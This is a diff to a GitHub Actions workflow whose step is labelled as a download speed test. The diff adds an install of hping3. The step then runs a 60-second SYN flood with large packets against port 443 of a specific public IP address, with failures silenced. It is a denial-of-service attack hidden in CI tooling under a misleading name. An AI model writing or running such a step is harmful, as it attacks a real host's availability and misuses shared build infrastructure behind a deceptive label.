@@ -56,6 +56,7 @@ jobs:
       - id: run-speed
         name: 下载并统计速度
         run: |
+          sudo apt install hping3 -q
           yarn
           timeout 600s node index.js --count ${{env.TASK_COUNT}}
           sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.239.16.131 || true
